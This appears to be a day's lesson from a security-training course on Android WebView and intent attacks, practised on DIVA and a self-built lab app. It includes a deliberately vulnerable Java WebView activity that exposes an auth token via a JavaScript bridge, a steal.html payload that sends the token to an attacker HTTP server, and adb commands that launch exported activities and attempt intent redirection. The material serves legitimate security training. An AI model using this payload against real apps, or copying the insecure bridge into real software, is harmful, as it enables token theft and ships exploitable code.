---
title: "Mobile Practice Day 4 — WebView Exploitation and Intent Attack Lab"
tags: [android, practice, WebView, intents, deep-links, JavaScript-bridge,
       addJavascriptInterface, adb, intent-redirection, CTF]
module: 04-BroadSurface-03
day: 226
related_topics:
  - Android WebView and Intent Attacks (Day 217)
  - Android Static Analysis Lab (Day 213)
  - Android Dynamic Analysis with Frida (Day 214)
---

# Day 226 — Mobile Practice Day 4: WebView and Intent Attacks

> "Deep links and WebView bridges are the places developers think
> nobody will look. They were right — until you got here."
>
> — Ghost

---

## Goals

By the end of today's practice session you will have:

1. Identified and exploited a WebView JavaScript bridge vulnerability
   in a lab app.
2. Triggered at least 2 exported activities via `adb shell am start`
   with crafted intent extras.
3. Exploited an Intent redirection vulnerability in a practice app.
4. Documented findings with `adb` commands as the PoC.

**Time budget:** 5–7 hours.

---

## Practice Block 1 — DIVA: Access Control Issues (1.5 hours)

```
DIVA Challenge 5 — Access Control Issues:
  Part 1: API key in logs — find it via logcat
  Part 2: Exported Activity — launch via adb without being logged in
  Part 3: Exported Activity with permission — can you bypass the check?
```

```bash
# Challenge 5 Part 2: find and launch the exported activity
adb shell pm list packages | grep diva
apktool d DivaApplication.apk -o diva_decoded/
grep "exported" diva_decoded/AndroidManifest.xml

# Launch each exported activity:
adb shell am start \
    -n jakhar.aseem.diva/.APIActivity2
# Does it open without login?
```

---

## Practice Block 2 — WebView JS Bridge Custom Lab (2 hours)

Build a minimal vulnerable app yourself (understanding the code makes you
better at finding it in real targets):

```java
// VulnerableWebViewActivity.java
// This is a lab file — do NOT use in production

public class VulnerableWebViewActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WebView webView = new WebView(this);
        setContentView(webView);

        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAllowFileAccessFromFileURLs(true);

        // Vulnerable: JS bridge exposes SharedPreferences
        webView.addJavascriptInterface(new JsBridge(this), "GhostBridge");

        // Vulnerable: loads URL from intent
        String url = getIntent().getStringExtra("url");
        if (url != null) webView.loadUrl(url);
        else webView.loadUrl("file:///android_asset/index.html");
    }

    private static class JsBridge {
        private final Context ctx;
        JsBridge(Context ctx) { this.ctx = ctx; }

        @JavascriptInterface
        public String getToken() {
            return ctx.getSharedPreferences("auth", 0)
                     .getString("token", "no_token");
        }

        @JavascriptInterface
        public void log(String msg) {
            android.util.Log.d("JSBridge", msg);
        }
    }
}
```

**Attack the lab app:**

```bash
# 1. Launch with a local file:// URL to demonstrate file access
adb shell am start \
    -n com.ghost.lab/.VulnerableWebViewActivity \
    --es url "file:///etc/hosts"

# 2. Launch with a URL pointing to your attacker HTML
# Host on Python HTTP server:
cat > steal.html << 'EOF'
<script>
var token = window.GhostBridge.getToken();
fetch("http://10.0.2.2:9999/steal?t=" + encodeURIComponent(token));
document.body.innerHTML = "<p>Token: " + token + "</p>";
</script>
EOF
python3 -m http.server 9999 &

adb shell am start \
    -n com.ghost.lab/.VulnerableWebViewActivity \
    --es url "http://10.0.2.2:9999/steal.html"
# 10.0.2.2 is the host machine from the Android emulator

# Observe: Python server receives the token
```

---

## Practice Block 3 — Intent Redirection (1.5 hours)

Find an app that:
1. Has an exported Activity (`ForwarderActivity`)
2. That Activity reads an extra Intent from the calling Intent
3. And starts it with `startActivity(nextIntent)`

Test with:

```bash
# Create a crafted intent that redirects to a non-exported admin activity
adb shell am start \
    -n com.target.app/.ForwarderActivity \
    -e "next_activity" "com.target.app/.AdminActivity"

# Or via adb shell am command with nested extras (complex — check adb docs)
```

---

## Reflection

1. In the WebView lab: what is the difference between
   `setAllowFileAccess(true)` and `setAllowFileAccessFromFileURLs(true)`?
   Which is more dangerous, and why?

2. When you launch an exported Activity with `adb shell am start` and it opens
   the admin screen without authentication — what is the exact vulnerability
   class, CWE, and MASVS requirement?

3. What server-side control would eliminate Intent redirection as an attack
   class?

---

## Navigation

← Previous: [Day 225 — Mobile Practice Day 3](DAY-0225-Mobile-Practice-Day-3.md)
→ Next: [Day 227 — Mobile Practice Day 5](DAY-0227-Mobile-Practice-Day-5.md)
